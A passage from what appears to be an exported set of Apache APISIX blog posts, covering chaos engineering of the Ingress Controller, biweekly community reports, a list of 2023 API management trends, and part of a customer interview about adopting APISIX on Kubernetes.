**Define the system under test:** Identify the specific components of the system you want to experiment on and develop clear and measurable objectives for the experiment. This includes creating a comprehensive list of the components, such as hardware and software, that will be tested, as well as defining the scope of the experiment and the expected outcomes.\\n\\n![under-test](https://static.apiseven.com/uploads/2023/04/23/rZOw3IbZ_under-test-3.png)\\n\\n>kube-apiserver: if an exception occurs, the Ingress resource write failed.\\n>Ingress-controller: Network interruption, Crash, Podfaults, I/O\\n>data-plane: Network interruption, Crash, Podfaults, I/O\\n\\n- **Choose the right experiment:** Select an experiment that is aligned with the objectives you have set and closely mimics a real-world scenario. This will help ensure that the experiment produces meaningful results and accurately reflects the behavior of the system.\\n- **Establish a hypothesis:** Establish a hypothesis about how the system will behave during the experiment and what outcomes you anticipate. This should be based on experience or research, and it should be reasonable and testable.\\n- **Run the experiment:** Run the experiment in a controlled environment, such as a staging environment, to limit the potential for harm to the production system. Collect all relevant data during the experiment and store it securely. There may be differing opinions on whether the experiment should take place directly in the production environment. However, for most scenarios, we need to ensure the Service Level Objective (SLO) of the system is met.\\n- **Evaluate the results:** Evaluate the results of the experiment and compare them to your hypothesis. Analyze the data collected and document any observations or findings. This includes identifying any unexpected results or discrepancies and determining how they might affect the system. Additionally, consider how the results of the experiment can be used to improve the system.\\n\\n## Main Usage Scenarios of Ingress Controller\\n\\nThe most important capability of an Ingress Controller is to proxy traffic, and all other functions are based on this core function. Therefore, when conducting Chaos Engineering, normal proxy traffic is the key metric.\\n\\nTo define the system under test for APISIX Ingress Controller, users need to create route configurations, such as Ingress, Gateway API, or CRD, and apply them to the Kubernetes cluster via Kubectl. This process goes through kube-apiserver for authentication, authorization, admission and other related procedures, and is then stored in etcd.\\n\\nThe APISIX Ingress Controller continuously watches for changes in Kubernetes resources. These configurations are then converted to configurations on the data plane. When a client requests the data plane, it accesses the upstream service according to the routing rules.\\n\\nIf kube-apiserver has an exception, it will prevent the configuration from being created, or the Ingress Controller from getting the correct configuration. Similarly, if there is an exception in the data plane, such as a network interruption or Pod killed, it will also not be able to do normal traffic proxy.\\n\\nThe scope of our experiment is mainly the impact on system availability if the Ingress Controller has an exception.\\n\\n**1. Detailed Operation Steps**\\n\\n- Choose the right experiment: We can cover many scenarios of incorrect configuration through end-to-end tests. Mainly through Chaos Engineering, we can verify whether the data plane can still proxy traffic normally when the Ingress Controller encounters an exception, such as DNS errors, network interruptions, or Pod killed.\\n- Establish a hypothesis: For each scenario, we can create a hypothesis such as \\"When the Ingress-controller Pod gets `X?`, the client\'s request can still get a normal response.\\"\\n- Run the experiment: The experiment and variables have been determined, so all that\'s left is to experiment.  \\nLitmus Chaos provides various ways to conduct experiments. We can do this through the Litmus Portal. To do this, we need to create a Chaos scenario, select the application to be experimented on, and these steps are relatively straightforward. However, we must pay attention to the fact that Litmus Chaos includes a Probes resource.\\n\\nProbes are pluggable checks that can be defined within the ChaosEngine for any Chaos Experiment. The experiment pods execute these checks based on the mode they are defined in and factor their success as necessary conditions in determining the verdict of the experiment, in addition to the standard in-built checks.\\nAt the same time, we can also schedule experiments, which is a very valuable function.\\n\\nAdditionally, Litmus Chaos also supports running experiments by submitting YAML manifests.\\n\\n![chaos-center-portal](https://static.apiseven.com/uploads/2023/04/23/2bpRFZWA_chaos-center-portal.png)\\n\\n- Evaluate the results: Litmus Chaos has built-in statistical reports, and it can be integrated with [Prometheus and Grafana](https://apisix.apache.org/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus/#installing-prometheus-and-grafana) to provide a unified dashboard for integration.\\n\\n![statistics-report](https://static.apiseven.com/uploads/2023/04/23/0Co6KugV_statistics-report.png)\\n\\n**2. Benefits and Future**\\n\\nThrough rigorous end-to-end testing and the power of Chaos Engineering, we\'re confident in the stability and reliability of the delivered APISIX Ingress Controller. Chaos Engineering has also helped us to identify and fix bugs. We\'re constantly working to improve and evolve this amazing project, and we invite you to join our community."},{"id":"Biweekly Report (Apr 10 - Apr 23)","metadata":{"permalink":"/blog/2023/04/26/weekly-report-0426","source":"@site/blog/2023/04/26/weekly-report-0426.md","title":"Biweekly Report (Apr 10 - Apr 23)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-04-26T00:00:00.000Z","formattedDate":"April 26, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.895,"truncated":true,"authors":[],"prevItem":{"title":"Building a More Robust Apache APISIX Ingress Controller With Litmus Chaos","permalink":"/blog/2023/05/04/apache-apisix-chaos-engineering"},"nextItem":{"title":"Top 10 API Management Trends for 2023","permalink":"/blog/2023/04/14/10-api-management-trends-2023"}},"content":"> From 4.10 to 4.23, 30 contributors submitted 51 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\nWe have also sorted out some issues for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/04/26/oqoEZoe5_%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5-20230426.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/04/26/hs1igYPY_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5-%E8%8B%B1%E6%96%8720230426.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Support bypassing Admin API Auth by configuration](https://github.com/apache/apisix/pull/9147)(Contributor: [An-DJ](https://github.com/An-DJ))\\n\\n- [Support store route\'s cert in secrets manager](https://github.com/apache/apisix/pull/9247)(Contributor: [soulbird](https://github.com/soulbird))\\n\\n## Recent Blog Recommendations\\n\\n- [Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful](https://apisix.apache.org/blog/2023/04/07/apisix-unity-group-q&a/)\\n\\n  Lukasz Biegaj, System Architect of Unity Group, shares the changes that APISIX has brought to their company in the interview: \\"Simple to use, powerful, and enjoyable to use. For projects using the APISIX, the time-to-market is considerably shorter and we - as a team or as a company - are able to deliver solutions more quickly.\\"\\n\\n- [gRPC on the client side](https://apisix.apache.org/blog/2023/03/16/grpc-client-side/)\\n\\n  This post explains how gRPC can benefit inter-service communication and demonstrates how to create a gRPC service using Spring Boot, and also provides a demonstration of how to configure APISIX with the grpc-transcode plugin to enable access for all clients.\\n\\n- [Make your security policy auditable](https://apisix.apache.org/blog/2023/03/02/security-policy-auditable/)\\n\\n  This blog shows how you can leverage OPA and Apache APISIX to move your authentication and authorization logic from the code to the infrastructure. The former allows you to audit your security policies, the latter coherence among all your upstream across all tech stacks.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Top 10 API Management Trends for 2023","metadata":{"permalink":"/blog/2023/04/14/10-api-management-trends-2023","source":"@site/blog/2023/04/14/10-api-management-trends-2023.md","title":"Top 10 API Management Trends for 2023","description":"10 major trends in API management: API security, standardization, cloud-based API management solutions, low-code API platforms, API marketplaces, emerging API protocols, AI and APIs, developer experience, API analytics, and serverless architecture.","date":"2023-04-14T00:00:00.000Z","formattedDate":"April 14, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":12.18,"truncated":true,"authors":[{"name":"API7.ai","title":"Author","url":"https://github.com/api7","image_url":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4","imageURL":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4"}],"prevItem":{"title":"Biweekly Report (Apr 10 - Apr 23)","permalink":"/blog/2023/04/26/weekly-report-0426"},"nextItem":{"title":"Biweekly Report (Mar 27 - Apr 9)","permalink":"/blog/2023/04/14/weekly-report-0414"}},"content":">This article introduces 10 significant trends in API management: API security, standardization, cloud-based API management solutions, low-code API platforms, API marketplaces, emerging API protocols, AI and APIs, developer experience, API analytics, and serverless architecture.\\n\x3c!--truncate--\x3e\\n\\nAPI management is increasingly crucial in digital transformation, accompanying the challenges and opportunities.\\n  \\nWe focus on the ten major trends in API management, including API security, standardization, cloud-based API management solutions, low-code API platforms, API marketplaces, emerging API protocols, AI and APIs, developer experience, API analytics, and serverless architecture.\\n\\nLet\'s dive into these trends, prepare for future challenges, capitalize on opportunities, and achieve ongoing growth and innovation in their businesses.\\n\\n## What Is an API? What Is API Management?\\n\\nRecently, the application of AI-generated content (AIGC) has become increasingly popular in various industries. AIGC service providers provide their content generation capabilities to the outside world through APIs, enabling users to easily access AIGC-related content. Obviously, APIs have become an important pillar of AIGC applications. So, what exactly is an API?\\n\\nAPI (Application Programming Interface) is a set of predefined rules and conventions for communication between different software applications. APIs enable software applications (clients) to request functionality and data from other software applications (servers), facilitating interaction and data sharing between different systems. By leveraging APIs, developers can use the functionality of other applications, allowing them to build and release new applications more quickly.\\n\\nAPI management involves the processes of creating and publishing APIs, formulating usage policies, controlling access rights, cultivating user communities, collecting and analyzing usage statistics, and reporting performance, typically including components such as an API gateway and a developer portal. Among these, the API gateway, as a key component, is responsible for handling and forwarding requests, as well as executing security and performance policies, while the developer portal is an online platform that provides developers with API documentation, key management, and other related resources.\\n\\nAs enterprises increasingly rely on APIs to drive digital transformation, the importance of API management has unprecedentedly risen. After a brief introduction to the relevant concepts above, we will explore the top ten trends in API management.\\n\\n### 1. API Security is Becoming Increasingly Important\\n\\nAPI security refers to the process of protecting the exchange of data and functionality between applications and systems through APIs. The primary goal of API security is to ensure the correctness, reliability, and confidentiality of data and functionality, and to prevent unauthorized access and potential malicious attacks. API security is critical for modern applications and enterprise services, as they heavily rely on APIs for data exchange and integration. The following are several important reasons why API security is crucial:\\n\\n1. **Data protection**: APIs are often used to transmit sensitive data, such as user information, transaction details, and payment information. Ensuring API security can prevent data leaks, tampering, and loss, protecting the information security of users and enterprises.\\n2. **System integrity**: Maintaining system integrity by ensuring that APIs can only be accessed by authorized users and compliant applications can help prevent malicious attackers from compromising or controlling the system through APIs.\\n3. **Trust and reputation**: A secure API is crucial in establishing user trust in enterprise services and building a positive brand reputation. Conversely, inadequate API security can harm the reputation of the enterprise and result in loss of users.\\n\\nTo ensure API security, API gateways are commonly used to manage security features like identity authentication and access control, which protect APIs from unauthorized access and attacks.\\n\\nThere are numerous API gateways available on the market, one of which is Apache APISIX. [Apache APISIX](https://api7.ai/apisix) is a cloud-native API gateway under the Apache Software Foundation that boasts dynamic, real-time, and high-performance capabilities. It provides a range of security features to ensure API security, including authentication via plugins like `key-auth` and `jwt-auth`, and access control via plugins like `consumer-restriction`. These features help businesses prevent data leaks and protect user privacy and enterprise interests.\\n\\n### 2. The Increasing Importance of API Standardization\\n\\nAs APIs become increasingly prevalent, standardizing their design is of growing importance. The following are several benefits of API standardization:\\n\\n1. **Facilitates collaboration and communication** within an organization by ensuring that different teams and departments adhere to uniform design principles and standards, thereby enhancing development efficiency and quality.\\n2. **Enhances the security and stability** of APIs by defining clear interfaces, data structures, and protocols, thereby mitigating the risks of errors or misuse.\\n3. **Improves the extensibility and interoperability** of APIs by adhering to industry or community-recognized design guidelines or best practices, enabling APIs to adapt to diverse scenarios and requirements.\\n\\nIn the process of API standardization, a common API standard specification is the [OpenAPI Specfication](https://swagger.io/specification/). Many tools and platforms support this specification to facilitate the import and management of APIs. For example, the [Apache APISIX Dashboard](https://github.com/apache/apisix-dashboard) can import relevant route data through OpenAPI documents.\\n\\n![import routes data](https://static.apiseven.com/uploads/2023/03/24/JoFz3ZOy_openapi.png)\\n\\nBy using these standard specifications, teams can easily share and manage APIs across different platforms and tools, further improving collaboration efficiency and API maintainability.\\n\\n### 3. Popularization of Cloud-based API Management Solutions\\n\\nTraditional API management solutions typically focus on deploying and managing APIs locally. This means that businesses need to purchase, deploy, and maintain hardware and software resources to support API development, publishing, and monitoring. However, with the development of businesses and the popularization of cloud computing technology, traditional API management solutions face challenges in scalability, cost-effectiveness, and cross-platform integration.\\n\\nCloud-based API management solutions have emerged as a viable alternative to traditional on-premises solutions. By leveraging the elasticity, pay-as-you-go, and cross-platform capabilities of cloud computing, these solutions provide businesses with a more flexible, efficient, and reliable way to manage their APIs. Typically, cloud-based API management solutions comprise components such as API gateways, security features, monitoring, and analytics, enabling businesses to achieve unified management of their APIs in hybrid cloud and multi-cloud environments.\\n\\nCloud-based API management solutions offer several advantages over traditional API management solutions, including:\\n\\n1. **High availability**: Cloud-based API management solutions provide elastic load balancing and auto-scaling features, as well as automated failover and disaster recovery capabilities, which result in increased availability.\\n2. **Cost-effectiveness**: By reducing the costs of API development, deployment, and maintenance, cloud-based API management solutions allow businesses to focus on innovation instead of infrastructure management.\\n3. **Cross-platform support**: Cloud-based API management solutions support hybrid and multi-cloud environments, enabling businesses to seamlessly integrate and manage their APIs across different cloud vendors, and easily migrate and scale them as needed.\\n\\nIt\'s worth mentioning that [API7 Cloud](https://api7.ai/cloud), based on Apache APISIX, is a cloud-based API management solution that provides a modern cloud architecture to help enterprises manage APIs deployed on hybrid cloud and multi-cloud environments. It efficiently and reliably connects them. Compared to traditional API management solutions, API7 Cloud offers more advantages and flexibility.\\n\\n### 4. Utilizing Low-Code API Platforms for Easy API Creation and Deployment\\n\\nLow-code API platforms are tools that enable users to create, publish, and manage APIs using a simple graphical interface and pre-built modules. These platforms are designed to streamline the API development process, reduce development barriers, and increase development efficiency.\\n\\nAn excellent example is [Apache APISIX Dashboard](https://github.com/apache/apisix-dashboard), which enables users to create routes without the need to manually write code. By using drag-and-drop functionality, users can easily arrange and combine different plugins.\\n\\n![plugin-config](https://static.apiseven.com/uploads/2023/03/21/b35zInFq_plugin-config.png)\\n\\n### 5. The Development of the API Marketplace\\n\\nWith the popularity of APIs, the API marketplace has gradually become a way for enterprises to discover, evaluate, and purchase APIs from various vendors. The API marketplace can help enterprises accelerate innovation and reduce development costs.\\n\\n1. For API suppliers, the API marketplace can increase the visibility and attractiveness of their APIs, increase their revenue and customer base, and utilize market analysis to optimize their API strategy and design.\\n2. For API consumers, the API marketplace can provide a convenient one-stop service that enables them to easily find and use various high-quality APIs to meet their business needs, and saves them time and resources in developing or maintaining these APIs themselves.\\n3. For the API ecosystem, the API marketplace can foster collaboration and innovation, inspiring new use cases and generating value by bringing together API suppliers and consumers.\\n\\n### 6. Rise of More API Protocols\\n\\nWith the rise of next-generation API protocols such as  [GraphQL](https://api7.ai/blog/what-is-graphql) and [gRPC](https://api7.ai/blog/what-is-grpc-and-how-to-work-with-apisix), which are competing with the current dominant but gradually declining [REST API](https://api7.ai/blog/understanding-and-using-restful-apis), more and more API protocols are being widely used.\\n\\nGraphQL is a data query and manipulation language developed by Facebook. It allows clients to explicitly request the required data based on their needs and obtain multiple resources in a single request, reducing data transmission and improving performance. Compared to REST API, GraphQL has the following advantages:\\n\\n1. **Flexible data requests**: Clients can specify the data they need, avoiding excessive or insufficient data transmission.\\n2. **More efficient request processing**: Retrieving multiple resources with a single request helps to reduce network round trips.\\n3. **Real-time data updates**: GraphQL supports real-time data updates and can respond promptly to clients\' data change needs.\\n\\n[gRPC](https://en.wikipedia.org/wiki/GRPC) is a high-performance, open-source remote procedure call (RPC) framework developed by Google. It allows clients to call server-side methods as if they were calling local methods. gRPC uses Protocol Buffers (Protobuf) as the interface definition language and data serialization format, enabling efficient data transmission. Compared to REST API, gRPC has several advantages:\\n\\n1. gRPC uses Protobuf for data serialization, which offers higher performance and smaller data size than JSON format.\\n2. gRPC is based on the HTTP/2 protocol, supporting bidirectional streaming, multiplexing, and built-in TLS security. This makes it faster, more flexible, and more secure than REST API based on the HTTP/1.1 protocol\'s one-way request-response mode.\\n3. gRPC defines APIs based on Protobuf and provides native code generation functionality. It can automatically generate client and server-side code in multiple programming languages, making it more convenient and consistent than REST API, which requires third-party tools like Swagger to generate code.\\n\\nIn order to accommodate the needs of emerging protocols, Apache APISIX offers a range of plugins designed to support the processing of different protocols.\\n\\nIn Apache APISIX, the following plugins can handle these emerging API protocols:\\n\\n- [grpc-transcode](https://apisix.apache.org/docs/apisix/plugins/grpc-transcode/): grpc-transcode facilitates conversion between HTTP and gRPC requests.\\n- [grpc-web](https://apisix.apache.org/docs/apisix/plugins/grpc-web/): grpc-web is a proxy plugin that processes gRPC Web requests from JavaScript clients to a gRPC service.\\n- [degraphql](https://apisix.apache.org/docs/apisix/plugins/degraphql/): degraphql is a plugin that supports the decoding of RESTful APIs into GraphQL.\\n\\n### 7. Artificial Intelligence and APIs\\n\\nAPI management platforms are leveraging machine learning and artificial intelligence to automate tasks such as API discovery, threat detection, and anomaly detection. This can help enterprises reduce the burden on their IT teams and improve the efficiency and accuracy of their API management processes.\\n\\n1. **Threat detection**: Machine learning and artificial intelligence can assist API management platforms in real-time monitoring and analyzing API traffic to detect and prevent any malicious or abnormal requests.\\n2. **Anomaly detection**: Machine learning and artificial intelligence can help API management platforms predict and diagnose any potential issues that may affect API performance or availability, facilitating timely repair and optimization.\\n\\n### 8. Greater Focus on Developer Experience\\n\\nAs APIs become increasingly central to business operations, developer experience has become increasingly important. API management platforms are adding more developer-friendly features, such as documentation, testing tools, and SDKs, to make it easier for developers to use APIs.\\n\\n1. **Documentation**: Documentation is the primary way for developers to understand and learn about an API, so it should describe the API\'s functions, parameters, examples, error codes, and other information clearly, completely, accurately, and in a timely manner. Documentation should also provide interactive consoles or sandboxes that allow developers to quickly test and debug APIs.\\n2. **Testing tools**: Testing tools are an essential means for developers to verify and optimize APIs, so they should support a variety of testing scenarios and requirements in a convenient, reliable, and flexible manner. Testing tools should also provide real-time feedback and reports so that developers can identify and resolve issues in a timely manner.\\n3. **SDKs**: SDKs are a convenient way for developers to integrate and use APIs, so they should cover a variety of mainstream programming languages and platforms and stay in sync with API updates. SDKs should also follow best practices and standards to make it easy for developers to understand and call APIs.\\n\\n### 9. The Rise of API Analytics\\n\\nAPI Analytics is a technology used to collect, analyze, and interpret data on API usage. With the growing popularity of APIs in the software and internet industries, API Analytics has emerged as a critical tool for management and optimization. Here are a few reasons for the rise of API Analytics:\\n\\n1. With the development of technologies such as cloud computing, big data, and the Internet of Things (IoT), APIs have become an important tool for exchanging data and functionality between enterprises and developers. This has led to a growing need for API Analytics to better understand and optimize API performance.\\n2. Modern software development increasingly adopts a microservices architecture, which decomposes complex applications into multiple independent and scalable services. These services communicate with each other via APIs, making the need for API Analytics more apparent in this architecture.\\n3. API Analytics can help detect potential security vulnerabilities and violations of compliance, thereby reducing risk.\\n\\n### 10. More APIs Are Provided Through Serverless Architecture\\n\\nServerless architecture is a cloud computing model that allows developers to deploy and run applications without managing servers.\\n\\nTo provide API services through serverless architecture, you only need to follow a few steps:\\n\\n1. Choose a serverless platform, and write your API logic code using the programming languages and frameworks provided by the serverless platform.\\n2. Configure your API triggers on the platform, such as HTTP requests, timers, events, etc.\\n3. Deploy your API code to the serverless platform using the relevant tools provided by the platform and test its functionality and performance.\\n\\nUsing serverless architecture has the following advantages:\\n\\n1. Serverless architecture allows API developers to focus on business logic without worrying about infrastructure, deployment, scaling, etc.\\n\\n2. Serverless architecture can automatically allocate resources according to API request volume, avoiding resource waste or shortages.\\n\\n3. Serverless architecture can improve API response speed and reliability by leveraging distributed edge computing nodes to process requests.\\n\\nApache APISIX also supports this area, including plugins such as [serverless](https://apisix.apache.org/docs/apisix/plugins/serverless/) and [openfunction](https://apisix.apache.org/docs/apisix/plugins/openfunction/).\\n\\n## Summary\\n\\nAPI management is an integral part of successful digital transformation, and as such, it brings both challenges and opportunities. As companies strive to stay ahead in the rapidly evolving digital landscape, it is crucial to keep up with the ten major trends in API management. By doing so, businesses can position themselves to meet future challenges, leverage new opportunities, and foster continuous growth and innovation."},{"id":"Biweekly Report (Mar 27 - Apr 9)","metadata":{"permalink":"/blog/2023/04/14/weekly-report-0414","source":"@site/blog/2023/04/14/weekly-report-0414.md","title":"Biweekly Report (Mar 27 - Apr 9)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-04-14T00:00:00.000Z","formattedDate":"April 14, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.02,"truncated":true,"authors":[],"prevItem":{"title":"Top 10 API Management Trends for 2023","permalink":"/blog/2023/04/14/10-api-management-trends-2023"},"nextItem":{"title":"Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful","permalink":"/blog/2023/04/07/apisix-unity-group-q&a"}},"content":"> From 3.27 to 4.9, 24 contributors submitted 44 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\nWe have also sorted out some issues for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/04/10/DIDm2aDQ_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5-07%E6%9C%9F.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/04/10/ysgQ4kpJ_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E6%96%B0%E6%99%8B%E6%B5%B7%E6%8A%A5-07%E5%91%A8.png)\\n\\n## Good First Issue\\n\\n### Issue #8772\\n\\nLink: [https://github.com/apache/apisix/issues/8772](https://github.com/apache/apisix/issues/8772)\\n\\nDescription: Set a validation on custom claims in OIDC auth\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Add upstream status report](https://github.com/apache/apisix/pull/9151)\uff08Contributor: [kingluo](https://github.com/kingluo)\uff09\\n\\n- [Suppot header injection for fault-injection plugin](https://github.com/apache/apisix/pull/9039)\uff08Contributor:  [kingluo](https://github.com/kingluo)\uff09\\n\\n### Apache APISIX Ingress\\n\\n- [Support webhook validate plugin](https://github.com/apache/apisix-ingress-controller/pull/1355)\uff08Contributor: [AlinsRan](https://github.com/AlinsRan)\uff09\\n\\n## Recent Blog Recommendations\\n\\n- [Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful](https://apisix.apache.org/blog/2023/04/07/apisix-unity-group-q&a/)\\n\\n  Lukasz Biegaj, System Architect of Unity Group, shares the changes that APISIX has brought to their company in the interview: \\"Simple to use, powerful, and enjoyable to use. For projects using the APISIX, the time-to-market is considerably shorter and we - as a team or as a company - are able to deliver solutions more quickly.\\"\\n\\n- [gRPC on the client side](https://apisix.apache.org/blog/2023/03/16/grpc-client-side/)\\n\\n  This post explains how gRPC can benefit inter-service communication and demonstrates how to create a gRPC service using Spring Boot, and also provides a demonstration of how to configure APISIX with the grpc-transcode plugin to enable access for all clients.\\n\\n- [Make your security policy auditable](https://apisix.apache.org/blog/2023/03/02/security-policy-auditable/)\\n\\n  This blog shows how you can leverage OPA and Apache APISIX to move your authentication and authorization logic from the code to the infrastructure. The former allows you to audit your security policies, the latter coherence among all your upstream across all tech stacks.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful","metadata":{"permalink":"/blog/2023/04/07/apisix-unity-group-q&a","source":"@site/blog/2023/04/07/apisix-unity-group-q&a.md","title":"Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful","description":"Lukasz Biegaj, System Architect of Unity Group, shares the changes that APISIX has brought to their company in the interview.","date":"2023-04-07T00:00:00.000Z","formattedDate":"April 7, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.57,"truncated":true,"authors":[{"name":"Qi Zeng","title":"Author","url":"https://github.com/Qizeng-api7","image_url":"https://github.com/Qizeng-api7.png","imageURL":"https://github.com/Qizeng-api7.png"}],"prevItem":{"title":"Biweekly Report (Mar 27 - Apr 9)","permalink":"/blog/2023/04/14/weekly-report-0414"},"nextItem":{"title":"Biweekly Report (Mar 13 - Mar 26)","permalink":"/blog/2023/03/30/weekly-report-0330"}},"content":"> Lukasz Biegaj, System Architect of Unity Group, shares the changes that APISIX has brought to their company in the interview.\\n\\"Simple to use, powerful, and enjoyable to use. For projects using the APISIX, the time-to-market is considerably shorter and we - as a team or as a company - are able to deliver solutions more quickly.\\" - This is the evaluation of APISIX by Lukasz Biegaj.\\n\x3c!--truncate--\x3e\\n\\nWe are honored to have Lukasz Biegaj, the System Architect of Unity Group, as our guest in this interview. Unity Group is one of the leading providers of e-commerce solutions in Poland. They have been facing the challenge of strong separation of roles, which has significantly increased their workload. This interview is presented in a Q&A format. Lukasz Biegaj will provide us with a detailed overview of the challenges that their company faced before adopting APISIX, the reasons behind selecting APISIX after comparing it with other alternatives, how APISIX resolved their pain points, and an overall assessment of their experience using APISIX.\\n\\n## Background Information\\n\\n**1. Would you give me a quick overview of Unity Group?**\\n\\nUnity Group is one of the largest providers of e-commerce solutions in Poland. The company exists for 25 years and has been providing technology for the digital transformation of enterprises. Most of our clients are e-commerce companies. We offer support in business and technology consulting, as well as software development.\\n\\n**2. Can you describe your role and your team?**\\n\\nI\'m a System Architect working with a team of 11 DevOps engineers. We design, implement and launch large-scale sites mainly related to e-commerce. We often use cloud services and Kubernetes as a platform to launch applications.\\n\\n**3. What was your team\'s process before using APISIX?**\\n\\nA few years ago, we had a process of designing and implementing applications that were strongly separated. The system administrator teams created the infrastructure, installed the components, and set up the deployment mechanisms. And the Development teams used them, focusing basically only on writing code and pressing the \'Deploy\' button.\\n\\nThis separation has become very blurred in recent years. Roles such as DevOps have emerged, and even developers themselves often want to be involved in deployment preparation or component selection.\\n\\nFrom the technical view, almost all components that we deploy require some form of HTTP communication. A few years ago, we used simple web servers, like the Apache Web Server. As the projects grew, we started using load balancers, like for example Haproxy or NGINX as they supported HTTP/2 before Apache2 and could be used as a reverse proxy.\\n\\nWe also tried some strictly API Gateway solutions, but most were expensive and difficult to deploy and support.\\n\\n**4. Were there any costs associated with the process before using APISIX?**\\n\\nI am not privy to the cost aspects and do not want to be. My focus is on technicalities and solutions that are good in a technical way.\\n\\nWhat I do know is that we rejected many closed-source solutions because the cost of implementing and maintaining them was high. Even leaving aside the licensing issues, just maintaining the knowledge was expensive.\\n\\n**5. What were the major pain points of your process before using APISIX?**\\n\\nStrong separation of roles: one person provisioned and configured the infrastructure, and another person - a developer - used it. Every change required communication and arrangements.\\n\\n**6. What other challenges were you and your team experiencing before using APISIX?**\\n\\nSetting up the monitoring properly was time-consuming. I am referring to metrics such as SLOs and monitoring of individual endpoints.\\n\\n## About the Technical Selection\\n\\n**1. How did you hear about APISIX?**\\n\\nWe have been investing heavily in Kubernetes, and the APISIX was mentioned as one of the projects implementing the new Gateway API.\\n\\n**2. How long have you been looking for a solution to previous problems?**\\n\\nWell, we deploy many projects so I would like to say: constantly. It\'s an iterative process. We always try to choose the best solutions for us and our customers, and the specific solutions change when a better one appears.\\n\\n**3. Were you comparing alternative solutions? Why us? Pros and cons? How long have you been using APISIX?**\\n\\nThe fact that APISIX is under the umbrella of the Apache Software Foundation was a very big advantage.\\n\\nThe rest came out of simple testing and proof-of-concept implementation.\\n\\nWe are using and deploying APISIX for about one year.\\n\\n## About the Implementing Process\\n\\n**1. Would you share some details about how your team implemented APISIX?**\\n\\nAll of our deployments of APISIX are within a Kubernetes cluster within AWS.\\n\\nWe are installing it from the official helm charts, exposing it through AWS Network Load Balancer. We terminate the SSL at the NLB so we can take advantage of AWS Certificate Manager.\\n\\nWe use the APISIX Ingress Controller to allow the users to configure the routes on their own, along with other manifests describing their Kubernetes application.\\n\\nWe use the built-in Prometheus plugin to consume and process data metrics, to create alerting rules and dashboards visualizing the application state.\\n\\n**2. Were there any internal risks or additional costs involved with implementing APISIX? If so, how did you address them?**\\n\\nI don\'t think we took any risks. Granted, this was a new software, a new solution, but being an open-source one we could comfortably test it in a proof-of-concept scenario.\\n\\nIt took some hours, but - I believe - not as much as would sending team members to workshops to learn an alternative, commercial solution.\\n\\n**3. How do you and your team currently use APISIX? What types of goals or tasks are you using APISIX to accomplish?**\\n\\nAt the moment it is our go-to API Gateway of choice in Kubernetes environments.\\n\\nIt allows us to easily set up an environment that can be perused by development teams in many projects to quickly prototype, create and deploy production-ready workloads.\\n\\n**4. What was the most obvious advantage you felt about APISIX?**\\n\\nSingle most obvious advantage: the ease of use.\\nMore advantages: being Kubernetes-native and open-source.\\n\\n## Achievements after Using APISIX\\n\\n**1. By using APISIX, can you measure any improvements in productivity or time savings?**\\n\\nFor projects using the APISIX, the time-to-market is considerably shorter and we - as a team or as a company - are able to deliver solutions more quickly.\\n\\n**2. In the beginning, you had concerns about the maturity of APISIX; how do you feel about them now?**\\n\\nWe\'re very used to using open-source projects, and it is of great concern for us for the projects to be actively maintained. We\'ve run into some issues with the helm charts at the beginning, but they either were fixed quickly (a bug report for one was already being fixed and merged) or our patches were quickly accepted into the main branch. In summary, we feel that the 